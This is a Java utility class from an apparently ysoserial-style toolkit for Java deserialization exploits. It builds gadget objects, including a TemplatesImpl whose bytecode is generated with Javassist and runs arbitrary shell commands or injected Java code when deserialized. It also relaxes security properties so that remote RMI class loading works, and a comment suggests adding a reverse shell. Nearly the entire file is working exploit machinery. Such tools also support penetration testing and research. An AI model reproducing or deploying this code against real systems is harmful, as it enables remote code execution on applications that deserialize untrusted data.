package ys.payloads.util;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.*;
import sun.misc.BASE64Decoder;

import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings({
        "restriction", "rawtypes", "unchecked"
})
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }


        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }


    public static Object createTemplatesImpl(final String command) throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(
                    command,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }


    public static <T> T createTemplatesImpl (final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory ) throws Exception {
        byte[] classBytes = null;
        final T templates = tplClass.newInstance();

        if(command.toLowerCase().startsWith("classbase64:")){
            classBytes = new BASE64Decoder().decodeBuffer(command.substring(12));
        }else {
            ClassPool pool = ClassPool.getDefault();
            final CtClass clazz = pool.makeClass("StubTransletPayload");
            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
            String cmd = "";
            if(command.startsWith("code:")) {
                cmd = command.substring(5);
            }else if(command.startsWith("codebase64:")){
                byte[] decode = new BASE64Decoder().decodeBuffer(command.substring(11));
                cmd = new String(decode);
            }else if(command.startsWith("codefile:")) {
                String codefile = command.substring(9);
                try {
                    File file = new File(codefile);
                    if (file.exists()) {
                        FileReader reader = new FileReader(file);
                        BufferedReader br = new BufferedReader(reader);
                        StringBuffer sb = new StringBuffer("");
                        String line = "";
                        while ((line = br.readLine()) != null) {
                            sb.append(line);
                            sb.append("\r\n");
                        }
                        cmd = sb.toString();
                    } else {
                        System.err.println(String.format("[-] code file %s not exists", codefile));
                        System.exit(0);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }else if(command.toLowerCase().startsWith("sleep:")) {
                int time = Integer.valueOf(command.substring(6)) * 1000;
                cmd = String.format("java.lang.Thread.sleep(%sL);",time);
            }else{
//                cmd = "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") + "\");";
                cmd = "try{java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", \"" + command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") + "\"});" + "}catch (java.io.IOException e){try{java.lang.Runtime.getRuntime().exec(new String[]{\"cmd\", \"/c\", \"" + command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") + "\"});}catch (java.io.IOException ee){}}";
            }
            clazz.makeClassInitializer().insertAfter(cmd);
            CtClass superC = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superC);
            classBytes = clazz.toBytecode();
        }
        // https://xz.aliyun.com/t/6227
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
        Reflections.setFieldValue(templates, "_name", "P");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }


    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static byte[] toByteArray(String filename) throws IOException {

        File f = new File(filename);
        if (!f.exists()) {
            throw new FileNotFoundException(filename);
        }

        ByteArrayOutputStream bos = new ByteArrayOutputStream((int) f.length());
        BufferedInputStream in = null;
        try {
            in = new BufferedInputStream(new FileInputStream(f));
            int buf_size = 1024;
            byte[] buffer = new byte[buf_size];
            int len = 0;
            while (-1 != (len = in.read(buffer, 0, buf_size))) {
                bos.write(buffer, 0, len);
            }
            return bos.toByteArray();
        } catch (IOException e) {
            e.printStackTrace();
            throw e;
        } finally {
            try {
                in.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            bos.close();
        }
    }
}